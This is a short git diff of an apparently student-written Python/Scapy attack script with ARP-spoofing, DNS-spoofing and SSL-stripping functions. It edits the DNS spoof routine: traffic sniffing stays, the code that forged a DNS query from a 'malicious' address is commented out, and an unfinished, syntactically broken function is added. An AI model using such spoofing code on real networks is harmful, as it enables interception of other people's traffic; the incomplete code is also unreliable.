@@ -30,15 +30,18 @@ def ARP_spoofing():
 
 # DNS-Spoof Attack
 def dns_spoof_attack():
-    packets = sniff(filter='udp port 53', count=1)
-    for packet in packets:
-        if packet.haslayer(DNS):
-            dns_packet = packet[DNS]
-            print("DNS Query: ", dns_packet.qd.qname)
-            # print("DNS Response: ", dns_packet.an.rdata)
+    packets = sniff(filter='udp port 53', count=10, )
+    # for packet in packets:
+    #     if packet.haslayer(DNS):
+    #         dns_packet = packet[DNS]
+    #         print("DNS Query: ", dns_packet.qd.qname)
+    #         # print("DNS Response: ", dns_packet.an.rdata)
             
-    dns_p1 = IP(src=ipMal, dst=ipM3) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=trapUrl))
-    dns_p1.show()
+    # dns_p1 = IP(src=ipMal, dst=ipM3) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=trapUrl))
+    # dns_p1.show()
+
+def process_packet: 
+
 
 # SSL strip one packet
 def ssl_strip(packet):
